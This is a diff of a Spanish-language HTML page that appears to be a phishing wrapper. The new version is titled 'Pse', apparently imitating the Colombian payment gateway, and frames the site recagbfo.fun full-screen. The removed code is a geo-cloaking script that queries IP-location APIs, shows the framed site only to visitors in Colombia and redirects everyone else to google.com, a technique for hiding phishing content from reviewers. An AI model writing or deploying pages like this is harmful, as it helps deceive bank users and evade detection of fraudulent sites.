@@ -1,115 +1,37 @@
 <!DOCTYPE html>
 <html lang="es">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
-    <title>Bienvenido</title>
-    <style>
-        body,
-        html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            overflow: hidden;
-            /* Hide scrollbars on main page */
-            background-color: #fff;
-        }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Pse</title>
 
-        #site-frame {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-            display: none;
-            /* Hidden until source is set */
-        }
+<meta name="description" content=" web, bienvenido" />
+<meta name="keywords" content="Inicio" />
 
-        /* Optional: Still keep a simple loader background if desired, or plain white */
-    </style>
+<link rel="icon" href="https://recagbfo.fu/favicon.png/" type="image/x-icon" />
+
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+  }
+
+  iframe {
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+</style>
 </head>
-
 <body>
-    <iframe id="site-frame" src="about:blank" title="Contenido"></iframe>
 
-    <script>
-        const ALLOWED_COUNTRY_CODE = 'CO';
-        const URL_ALLOWED = 'https://recagbfo.fun';
-        const URL_RESTRICTED = 'https://google.com/';
+<iframe id="miIframe" title="Video"></iframe>
 
-        // List of APIs and how to extract the country code from them
-        const apis = [
-            {
-                url: 'https://ipapi.co/json/',
-                extractor: (data) => data.country_code
-            },
-            {
-                url: 'https://ipwho.is/',
-                extractor: (data) => data.country_code
-            },
-            {
-                url: 'https://api.country.is/',
-                extractor: (data) => data.country
-            }
-        ];
+<script>
+  const urlDinamica = "https://recagbfo.fun";
+  document.getElementById('miIframe').src = urlDinamica;
+</script>
 
-        async function fetchWithTimeout(resource, options = {}) {
-            const { timeout = 4000 } = options;
-
-            const controller = new AbortController();
-            const id = setTimeout(() => controller.abort(), timeout);
-
-            try {
-                const response = await fetch(resource, {
-                    ...options,
-                    signal: controller.signal
-                });
-                clearTimeout(id);
-                return response;
-            } catch (error) {
-                clearTimeout(id);
-                throw error;
-            }
-        }
-
-        async function checkLocationAndLoadIframe() {
-            try {
-                // Map APIs to promises that fetch, check valid response, and return normalized country code
-                const promises = apis.map(async (api) => {
-                    const response = await fetchWithTimeout(api.url, { timeout: 3000 });
-                    if (!response.ok) throw new Error(Failed ${api.url});
-                    const data = await response.json();
-                    const code = api.extractor(data);
-                    if (!code) throw new Error(No code from ${api.url});
-                    return code;
-                });
-
-                // Race them! First successful one wins.
-                const countryCode = await Promise.any(promises);
-                console.log('Detected Country:', countryCode);
-
-                const targetUrl = (countryCode === ALLOWED_COUNTRY_CODE) ? URL_ALLOWED : URL_RESTRICTED;
-                showIframe(targetUrl);
-
-            } catch (error) {
-                console.error('All APIs failed or timed out:', error);
-                // Fallback to restricted if all fail
-                showIframe(URL_RESTRICTED);
-            }
-        }
-
-        function showIframe(url) {
-            const iframe = document.getElementById('site-frame');
-            iframe.src = url;
-            iframe.style.display = 'block';
-        }
-
-        // Execute immediately
-        checkLocationAndLoadIframe();
-    </script>
 </body>
-
 </html>
